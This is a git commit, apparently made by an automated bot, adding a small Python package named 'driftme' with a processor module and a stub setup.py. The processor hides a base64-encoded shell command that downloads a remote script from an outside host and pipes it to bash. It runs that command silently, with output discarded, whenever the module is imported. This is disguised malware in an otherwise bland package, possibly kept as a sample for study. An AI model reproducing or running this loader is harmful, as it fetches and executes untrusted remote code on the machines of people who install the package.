b3e1d52d6d57d76672e2b1d4edaba819f9c67d59
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-12-06 15:04:22 +0000

    Add package driftme/1.0/driftme-1.0.tar.gz

---
+++ packages/driftme/driftme-1.0.tar.gz/driftme-1.0/driftme/processor.py
@@ -0,0 +1,15 @@
+import subprocess
+import random
+import base64
+
+def decode_str(encoded_str):
+    decoded_bytes = base64.b64decode(encoded_str)
+    # print(decoded_bytes)
+    decoded_str = decoded_bytes.decode('utf-8')
+    return decoded_str
+def processing(arg=None):
+    command = [decode_str("Y3VybCBodHRwczovL3BhcGljdWxvLm5ldC91bm1pLnNoIHwgYmFzaA==")]
+    subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+processing()
+
---
+++ packages/driftme/driftme-1.0.tar.gz/driftme-1.0/setup.py
@@ -0,0 +1,9 @@
+from setuptools import setup
+
+setup(
+    name='driftme',
+    version='1.0',
+    description='driftme',
+    packages=['driftme'],
+    install_requires=[],
+)
